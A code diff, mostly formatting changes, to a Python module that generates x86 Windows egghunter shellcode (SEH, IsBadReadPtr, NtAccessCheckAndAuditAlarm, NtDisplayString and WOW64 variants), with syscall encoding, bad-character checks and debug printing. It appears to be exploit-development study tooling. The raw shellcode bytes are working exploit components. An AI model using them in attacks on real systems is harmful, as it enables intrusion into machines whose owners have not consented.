@@ -200,7 +200,7 @@ def encode_syscall(syscall: int, badchars: bytes) -> bytes:
     raw = neg.to_bytes(4, "little", signed=False)
     if any(b in badchars for b in raw):
         raise BadCharError("NEG encoding contains badchars")
-    return b"\xB8" + raw + b"\xF7\xD8"
+    return b"\xb8" + raw + b"\xf7\xd8"
 
 
 def _pack32(value: int) -> bytes:
@@ -223,7 +223,9 @@ def hunter_x86_seh(tag: bytes, excluded: bytes = b"") -> bytes:
     return shellcode
 
 
-def hunter_x86_isbadreadptr(tag: bytes, isbadreadptr_addr: int, excluded: bytes = b"") -> bytes:
+def hunter_x86_isbadreadptr(
+    tag: bytes, isbadreadptr_addr: int, excluded: bytes = b""
+) -> bytes:
     validate_tag(tag)
     shellcode = (
         b"\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08\x53\xb8"
@@ -242,14 +244,7 @@ def hunter_x86_ntaccess(tag: bytes, syscall_id: int, excluded: bytes = b"") -> b
     syscall_load = encode_syscall(syscall_id, excluded_norm)
 
     shellcode = (
-        b"\x66\x81\xca\xff\x0f"
-        b"\x42"
-        b"\x52"
-        + syscall_load
-        + b"\xcd\x2e"
-        b"\x3c\x05"
-        b"\x5a"
-        b"\x74"
+        b"\x66\x81\xca\xff\x0f\x42\x52" + syscall_load + b"\xcd\x2e\x3c\x05\x5a\x74"
     )
 
     if len(syscall_load) == 3:
@@ -269,7 +264,9 @@ def hunter_x86_ntaccess(tag: bytes, syscall_id: int, excluded: bytes = b"") -> b
     return shellcode
 
 
-def hunter_x86_ntdisplaystring(tag: bytes, syscall_id: int, excluded: bytes = b"") -> bytes:
+def hunter_x86_ntdisplaystring(
+    tag: bytes, syscall_id: int, excluded: bytes = b""
+) -> bytes:
     return hunter_x86_ntaccess(tag=tag, syscall_id=syscall_id, excluded=excluded)
 
 
@@ -290,9 +287,7 @@ def hunter_x86_wow64_win10_ntaccess(tag: bytes, excluded: bytes = b"") -> bytes:
         b"\x5a"
         b"\x3c\x05"
         b"\x74\xe3"
-        b"\xb8"
-        + tag
-        + b"\x8b\xfa\xaf\x75\xde\xaf\x75\xdb\xff\xe7"
+        b"\xb8" + tag + b"\x8b\xfa\xaf\x75\xde\xaf\x75\xdb\xff\xe7"
     )
     validate_badchars(shellcode, excluded)
     return shellcode
@@ -320,8 +315,14 @@ def build(
             excluded=excluded_norm,
         )
     elif kind == "x86_ntdisplaystring":
-        sid = resolve_syscall(target, "NtDisplayString") if syscall_id is None else syscall_id
-        shellcode = hunter_x86_ntdisplaystring(tag=tag, syscall_id=sid, excluded=excluded_norm)
+        sid = (
+            resolve_syscall(target, "NtDisplayString")
+            if syscall_id is None
+            else syscall_id
+        )
+        shellcode = hunter_x86_ntdisplaystring(
+            tag=tag, syscall_id=sid, excluded=excluded_norm
+        )
     elif kind == "x86_ntaccess":
         sid = (
             resolve_syscall(target, "NtAccessCheckAndAuditAlarm")
@@ -379,7 +380,9 @@ def choose_hunter(
                     if ntaccess_syscall_id is None
                     else ntaccess_syscall_id
                 )
-                shellcode = hunter_x86_ntaccess(tag=tag, syscall_id=syscall, excluded=excluded_norm)
+                shellcode = hunter_x86_ntaccess(
+                    tag=tag, syscall_id=syscall, excluded=excluded_norm
+                )
                 uses_syscall = True
             elif variant == "x86_ntdisplaystring":
                 syscall = (
@@ -387,7 +390,9 @@ def choose_hunter(
                     if ntdisplaystring_syscall_id is None
                     else ntdisplaystring_syscall_id
                 )
-                shellcode = hunter_x86_ntdisplaystring(tag=tag, syscall_id=syscall, excluded=excluded_norm)
+                shellcode = hunter_x86_ntdisplaystring(
+                    tag=tag, syscall_id=syscall, excluded=excluded_norm
+                )
                 uses_syscall = True
             elif variant == "x86_seh":
                 shellcode = hunter_x86_seh(tag=tag, excluded=excluded_norm)
@@ -416,7 +421,8 @@ def choose_hunter(
 def debug_hunter_info(name: str, shellcode: bytes) -> None:
     print(f"[+] Selected: {name}")
     print(f"[+] Size: {len(shellcode)}")
-    print(f"[+] Bytes: {shellcode.hex()}")
+    print(f"[+] Bytes (hex): {shellcode.hex()}")
+    print(f"[+] Bytes (escaped): {to_hex_escaped(shellcode)}")
 
 
 def exam_workflow_note() -> str:
